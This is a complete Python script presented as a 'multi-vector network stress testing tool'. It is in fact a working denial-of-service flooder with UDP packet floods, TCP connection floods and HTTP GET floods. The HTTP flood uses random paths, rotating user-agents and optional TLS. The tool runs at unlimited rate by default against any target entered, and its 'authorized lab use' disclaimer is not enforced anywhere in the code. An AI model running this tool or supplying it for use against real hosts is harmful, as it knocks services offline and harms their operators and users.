#!/usr/bin/env python3
"""
stresstool.py — multi-vector network stress testing tool (authorized lab use)

Vectors: udp (L3/4 flood) | tcp (connection flood) | http (L7 GET flood)

Usage:
  python3 stresstool.py                          -> interactive menu
  python3 stresstool.py udp <ip> -p 9999 -t 8 -d 30
  python3 stresstool.py http <ip> -p 443 --tls --host site.com -t 16 -d 60 -r 2000

Test ONLY systems you own or have written authorization to test.
"""

import argparse
import os
import random
import signal
import socket
import ssl
import string
import sys
import threading
import time

SENT = 0
ERRS = 0
LOCK = threading.Lock()
STOP = threading.Event()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
]

BANNER = r"""
  _____ _______ ______ _____  _    _
 / ____|__   __|  ____|  __ \| |  | |
| (___    | |  | |__  | |__) | |__| |
 \___ \   | |  |  __| |  _  /|  __  |
 ____) |  | |  | |____| | \ \| |  | |
|_____/   |_|  |______|_|  \_\_|  |_|
  multi-vector stress test | lab use
"""


def bump(ok=True):
    global SENT, ERRS
    with LOCK:
        SENT += 1 if ok else 0
        ERRS += 0 if ok else 1


def paced_sleep(rate, start):
    """Global rate ceiling: wait this send's share of 1/rate seconds."""
    if rate <= 0:
        return
    with LOCK:
        elapsed = max(time.time() - start, 0.001)
        allowed = elapsed * rate
        total = SENT + ERRS
        delay = (total + 1 - allowed) / rate if total >= allowed else 0
    if delay > 0:
        time.sleep(delay)


def rand_path():
    return "/" + "".join(random.choices(string.ascii_letters + string.digits, k=8))


def resolve(target):
    try:
        return socket.gethostbyname(target)
    except socket.gaierror:
        sys.exit(f"[!] cannot resolve target: {target}")


# ------------------------------ workers ------------------------------

def udp_worker(ip, port, size, rotate, rate, start):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    p = port
    while not STOP.is_set():
        paced_sleep(rate, start)
        try:
            s.sendto(os.urandom(size), (ip, p))
            bump(True)
        except OSError:
            bump(False)
        if rotate:
            p = 1 if p >= 65534 else p + 1
    s.close()


def tcp_worker(ip, port, rate, start):
    while not STOP.is_set():
        paced_sleep(rate, start)
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((ip, port))
            s.sendall(os.urandom(64))
            s.shutdown(socket.SHUT_RDWR)
            bump(True)
        except OSError:
            bump(False)
        finally:
            if s:
                try:
                    s.close()
                except OSError:
                    pass


def http_worker(ip, port, host, use_tls, rate, start):
    host = host or ip
    while not STOP.is_set():
        paced_sleep(rate, start)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            if use_tls:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.connect((ip, port))
            req = (
                f"GET {rand_path()} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                "Accept: */*\r\n"
                "Connection: close\r\n\r\n"
            )
            s.sendall(req.encode())
            s.recv(128)
            bump(True)
        except OSError:
            bump(False)
        finally:
            try:
                s.close()
            except Exception:
                pass


# ------------------------------ runtime ------------------------------

def monitor(start, duration):
    global SENT, ERRS
    last = last_err = 0
    while not STOP.is_set():
        time.sleep(1)
        with LOCK:
            now, now_err = SENT, ERRS
        print(f"  [{time.time()-start:6.1f}s] {now-last:>8d} sent | "
              f"{now_err-last_err:>4d} err | total {now}", flush=True)
        last, last_err = now, now_err
        if duration and time.time() - start > duration:
            STOP.set()


def run(vector, ip, port, threads, duration, rate, size=1400, rotate=False,
        host=None, use_tls=False):
    start = time.time()
    if vector == "udp":
        fn = lambda: udp_worker(ip, port, size, rotate, rate, start)
    elif vector == "tcp":
        fn = lambda: tcp_worker(ip, port, rate, start)
    else:
        fn = lambda: http_worker(ip, port, host, use_tls, rate, start)

    print(f"  [+] target  {ip}:{port}")
    print(f"  [+] vector  {vector} | threads {threads} | "
          f"rate {'unlimited' if rate == 0 else f'{rate}/s'} | "
          f"duration {duration}s\n")

    def sigint(_sig, _frm):
        print("\n  [!] Ctrl+C — stopping...", flush=True)
        STOP.set()
    signal.signal(signal.SIGINT, sigint)

    mon = threading.Thread(target=monitor, args=(start, duration), daemon=True)
    mon.start()
    threads_list = [threading.Thread(target=fn, daemon=True) for _ in range(threads)]
    for t in threads_list:
        t.start()
    for t in threads_list:
        t.join(timeout=duration + 2)

    elapsed = max(time.time() - start, 0.001)
    print(f"\n  [✓] done — {SENT} sent, {ERRS} errors in {elapsed:.1f}s "
          f"({int(SENT/elapsed)} avg pps)")


# ------------------------------ menus ------------------------------

def ask(prompt, default=None, cast=str):
    raw = input(prompt).strip()
    if not raw and default is not None:
        return default
    try:
        return cast(raw)
    except ValueError:
        return default


def interactive():
    print(BANNER)
    print("  [i] authorized lab testing only — own systems / written permission\n")
    vector = ""
    while vector not in ("udp", "tcp", "http"):
        vector = ask("  vector (udp/tcp/http) [udp]: ", "udp").lower()
    target = ask("  target ip/hostname: ")
    if not target:
        sys.exit("  [!] target required")
    port = ask("  port [80]: ", 80, int)
    threads = ask("  threads [8]: ", 8, int)
    duration = ask("  duration seconds [30]: ", 30, int)
    rate = ask("  rate ceiling pps, 0=unlimited [0]: ", 0, int)
    size = rotate = host = use_tls = None
    if vector == "udp":
        size = ask("  payload size bytes [1400]: ", 1400, int)
        rotate = ask("  rotate ports (y/n) [n]: ", "n").lower() == "y"
    if vector == "http":
        host = input("  host header/SNI (blank=target): ").strip() or None
        use_tls = input("  use TLS/https (y/n) [n]: ").strip().lower() == "y"
    run(vector, resolve(target), port, threads, duration, rate,
        size or 1400, rotate, host, use_tls)


def cli():
    ap = argparse.ArgumentParser(description="multi-vector stress testing tool")
    ap.add_argument("vector", choices=["udp", "tcp", "http"])
    ap.add_argument("target", help="IP or hostname")
    ap.add_argument("-p", "--port", type=int, default=80)
    ap.add_argument("-t", "--threads", type=int, default=8)
    ap.add_argument("-d", "--duration", type=int, default=30)
    ap.add_argument("-r", "--rate", type=int, default=0)
    ap.add_argument("-s", "--size", type=int, default=1400)
    ap.add_argument("--rotate", action="store_true")
    ap.add_argument("--host", help="Host header / SNI (http)")
    ap.add_argument("--tls", action="store_true", help="TLS (http)")
    args = ap.parse_args()
    run(args.vector, resolve(args.target), args.port, args.threads,
        args.duration, args.rate, args.size, args.rotate, args.host, args.tls)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        cli()
    else:
        interactive()
